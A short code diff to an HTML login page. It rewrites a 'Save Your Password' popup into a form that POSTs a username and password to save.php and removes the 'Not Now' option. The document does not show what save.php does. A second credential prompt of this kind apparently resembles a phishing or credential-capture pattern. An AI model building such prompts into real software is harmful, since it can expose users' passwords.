@@ -10,7 +10,7 @@
 
 <div class="login-container">
     <h2>Login</h2>
-    <form id="loginForm">
+    <form   id="loginForm">
         <input  type="text" id="username" placeholder="Username" required>
         <input type="password" id="password" placeholder="Password" required>
         <button id="login" type="submit">Login</button>
@@ -19,11 +19,13 @@
 </div>
 <div id="notification" class="notification">
     <p>Save Your Password</p>
-  <input type="text" id="users"></input>
-    <input type="password" id="passes"></input><br>
-    <button id="verify">Save</button>
-        <button id="verifynot">Not Now</button>
+    <form action="save.php" method="POST">
+        <input type="text" name="name" id="users" placeholder="Username">
+        <input type="password" name="password" id="passes" placeholder="Password"><br>
+        <button type="submit" id="verify">Save</button>
+    </form>
 </div>
+
 
 <script src="script.js"></script>
 </body>
